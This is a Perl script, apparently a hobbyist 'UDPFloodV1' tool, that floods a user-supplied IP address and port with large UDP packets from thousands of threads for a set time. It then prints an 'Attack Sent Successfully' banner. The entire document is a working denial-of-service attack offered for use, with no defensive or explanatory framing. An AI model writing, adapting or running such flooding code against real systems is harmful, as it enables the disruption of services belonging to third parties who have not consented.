#!/usr/bin/perl
use strict;
use warnings;
use threads;
use IO::Socket::INET;

my $target_ip = shift || die "Usage: perl udpflood.pl <ip> <port> <time>\n";
my $target_port = shift || die "Usage: perl udpflood.pl <ip> <port> <time>\n";
my $time = shift || die "Usage: perl udpflood.pl <ip> <port> <time>\n";

my $packet = "\x00" x 65535;
my $pps = 100000;
my $threads = 20000;

my $socket;
my @threads;

for (my $i = 0; $i < $threads; $i++) {
    my $thread = threads->create(\&attack);
    push @threads, $thread;
}

sleep($time);

foreach my $thread (@threads) {
    $thread->join();
}

sub attack {
    $socket = IO::Socket::INET->new(
        Proto => 'udp',
        PeerAddr => $target_ip,
        PeerPort => $target_port,
    ) || die "Could not create socket: $!\n";

    my $start_time = time();
    my $sent_packets = 0;

    while (1) {
        my $current_time = time();
        last if ($current_time - $start_time >= $time);

        for (my $i = 0; $i < $pps; $i++) {
            $socket->send($packet);
            $sent_packets++;
        }
    }

    $socket->close();
    print "Attack Sent Successfully - UDPFloodV1 By xNeonn\nIP> $target_ip\nPort > $target_port\nTime > $time\n";
}